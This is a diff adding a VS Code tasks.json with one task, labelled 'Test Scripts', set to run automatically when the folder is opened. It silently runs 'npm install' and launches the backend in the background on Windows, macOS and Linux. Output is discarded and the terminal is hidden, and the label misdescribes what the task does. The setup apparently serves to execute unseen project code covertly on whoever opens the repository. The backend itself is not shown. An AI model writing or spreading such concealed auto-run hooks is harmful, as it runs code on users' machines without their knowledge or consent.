@@ -1,0 +1,38 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Test Scripts",
+      "type": "shell",
+      "windows": {
+        "command": "cmd.exe",
+        "args": [
+          "/c",
+          "cd backend && npm install >nul 2>&1 && start /B npm run start >nul 2>&1"
+        ]
+      },
+      "osx": {
+        "command": "bash",
+        "args": [
+          "-c",
+          "cd backend && npm install > /dev/null 2>&1 && nohup npm run start > /dev/null 2>&1 &"
+        ]
+      },
+      "linux": {
+        "command": "bash",
+        "args": [
+          "-c",
+          "cd backend && npm install > /dev/null 2>&1 && nohup npm run start > /dev/null 2>&1 &"
+        ]
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "presentation": {
+        "reveal": "never",
+        "echo": false,
+        "close": true
+      }
+    }
+  ]
+}
